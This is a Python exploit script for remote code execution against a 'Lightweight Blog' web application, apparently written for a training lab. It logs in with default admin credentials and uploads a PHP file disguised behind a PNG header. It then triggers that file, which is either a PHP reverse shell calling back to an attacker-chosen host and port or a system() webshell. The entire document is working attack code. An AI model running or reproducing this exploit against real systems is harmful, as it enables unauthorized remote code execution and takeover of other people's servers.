#!/usr/bin/env python3
import requests
import base64
import json
import re
import argparse
from requests_toolbelt.multipart.encoder import MultipartEncoder


class LightweightBlogExploit:
    def __init__(self, target, username="admin", password="admin123!@#"):
        self.target = target.rstrip("/")
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.csrf_token = None

    @staticmethod
    def decode_hex_escapes(s):
        return s.encode("utf-8").decode("unicode_escape")

    def extract_csrf_token(self, html):
        decoded_html = self.decode_hex_escapes(html)
        match = re.search(r'Csrf-Token":"([a-f0-9]+)"', decoded_html)
        if match:
            return match.group(1)
        return None

    def login(self):
        print("[*] Fetching CSRF token...")
        r = self.session.get(f"{self.target}/")
        if r.status_code != 200:
            print(f"[-] Failed to connect, status: {r.status_code}")
            return False

        self.csrf_token = self.extract_csrf_token(r.text)
        if not self.csrf_token:
            print("[-] Could not extract CSRF token")
            return False

        print(f"[+] Got CSRF token: {self.csrf_token}")
        print("[*] Logging in...")

        headers = {"Csrf-Token": self.csrf_token}
        data = {"action": "login", "nick": self.username, "pass": self.password}
        r = self.session.post(f"{self.target}/ajax.php", headers=headers, data=data)

        if r.status_code == 200:
            try:
                j = r.json()
                if "error" in j and j["error"]:
                    print("[-] Login failed!")
                    return False
                print(f"[+] Successfully logged in as {self.username}")
                return True
            except json.JSONDecodeError:
                print("[-] Failed to parse login response")
                return False
        else:
            print(f"[-] Login failed! HTTP {r.status_code}")
            return False

    def upload_shell(self, php_payload):
        print("[*] Uploading shell...")
        png_header = base64.b64decode(
            "iVBORw0KGgoAAAANSUhEUgAAABgAAAAbCAIAAADpgdgBAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAJElEQVQ4"
        )
        shell_content = png_header + php_payload.encode()

        m = MultipartEncoder(fields={"file": ("mia.php", shell_content, "image/png")})
        headers = {"Csrf-Token": self.csrf_token, "Content-Type": m.content_type}

        r = self.session.post(
            f"{self.target}/ajax.php?action=upload_image",
            headers=headers,
            data=m,
        )

        if r.status_code == 200:
            try:
                j = r.json()
                if "path" not in j:
                    print("[-] Unexpected server response, no path found")
                    return None
                print(f"[+] Shell uploaded as {j['path']}")
                return j["path"]
            except json.JSONDecodeError:
                print("[-] Failed to parse upload response")
                return None
        else:
            print(f"[-] Upload failed, HTTP {r.status_code}")
            return None

    def trigger_shell(self, shell_path):
        print("[*] Triggering shell...")
        r = self.session.get(f"{self.target}/{shell_path}")
        if r.status_code == 200:
            print("[+] Payload triggered, check your listener!")
        else:
            print(f"[-] Failed to trigger shell, HTTP {r.status_code}")


def build_reverse_shell(lhost, lport):
    """Generate a PHP reverse shell payload"""
    return f"""<?php
$ip='{lhost}'; 
$port={lport}; 
$sock=fsockopen($ip,$port); 
$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>"""


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Lightweight Blog RCE Exploit")
    parser.add_argument("target", help="Target URL (e.g. http://blog.inlanefreight.local)")
    parser.add_argument("-u", "--username", default="admin", help="Username (default: admin)")
    parser.add_argument("-p", "--password", default="admin123!@#", help="Password (default: admin123!@#)")
    parser.add_argument("--lhost", help="Local host for reverse shell")
    parser.add_argument("--lport", type=int, help="Local port for reverse shell")
    parser.add_argument("--payload", help="Path to custom PHP payload file (overrides --lhost/--lport)")

    args = parser.parse_args()

    # Choose payload
    if args.payload:
        with open(args.payload, "r") as f:
            php_payload = f.read()
    elif args.lhost and args.lport:
        php_payload = build_reverse_shell(args.lhost, args.lport)
    else:
        php_payload = "<?php system($_GET['cmd']); ?>"  # default webshell

    exploit = LightweightBlogExploit(args.target, args.username, args.password)

    if exploit.login():
        path = exploit.upload_shell(php_payload)
        if path:
            exploit.trigger_shell(path)
